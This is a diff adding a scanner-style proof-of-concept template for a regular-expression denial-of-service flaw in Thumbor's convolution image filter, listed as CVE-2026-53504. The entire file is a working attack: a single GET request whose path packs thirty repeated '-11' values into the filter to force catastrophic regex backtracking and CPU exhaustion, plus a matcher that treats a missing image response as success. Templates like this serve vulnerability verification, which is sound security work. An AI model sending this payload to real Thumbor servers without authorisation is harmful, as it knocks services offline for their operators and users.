@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "验证 Thumbor 卷积过滤器正则表达式拒绝服务漏洞：发送包含30个重复数值的恶意 convolution 滤镜参数，触发正则表达式指数级回溯，导致 CPU 资源耗尽"
+id = "POC-AVE-2026-0769"
+name = "Thumbor Convolution Filter ReDoS PoC"
+severity = "high"
+tags = ["ave-2026-0769"]
+vuln_id = [
+    "CVE-2026-53504",
+    "AVE-2026-0769",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/unsafe/0x0/smart/filters:convolution(-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11;-11)/x.png"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "image",
+    "PNG",
+    "Content-Type",
+]
